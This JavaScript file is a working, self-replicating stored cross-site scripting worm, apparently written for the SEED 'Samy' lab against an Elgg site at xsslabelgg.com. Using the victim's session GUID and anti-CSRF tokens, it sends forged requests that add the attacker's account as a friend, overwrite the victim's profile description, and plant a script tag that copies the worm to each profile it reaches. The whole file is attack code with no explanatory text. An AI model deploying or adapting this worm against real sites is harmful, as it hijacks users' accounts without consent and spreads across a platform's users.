window.onload = function() {
    var Ajax = null;

    var samyGuid = 47;
    var guid = "&guid=" + elgg.session.user.guid;
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

    // Construct the HTTP request to add Samy as a friend
    var sendurl = "http://www.xsslabelgg.com/action/friends/add?" +
        "friend=" + samyGuid +
        ts +
        token;

    // Create and send Ajax request to add friend
    Ajax = new XMLHttpRequest();
    Ajax.open("GET", sendurl, true);
    Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    Ajax.send();

    // Construct the HTTP request to modify profile
    sendurl = "http://www.xsslabelgg.com/action/profile/edit";
    var content = "briefdescription=Samy+is+my+hero" + guid + ts + token;

    // Create and send Ajax request to modify profile
    if (elgg.session.user.guid != samyGuid) {
        Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
    }

    // Copy worm to victim's profile
    content = `description=<script type="text/javascript" src="${location}"></script>` +
        guid + ts + token;

    if (elgg.session.user.guid != samyGuid) {
        Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
    }

}
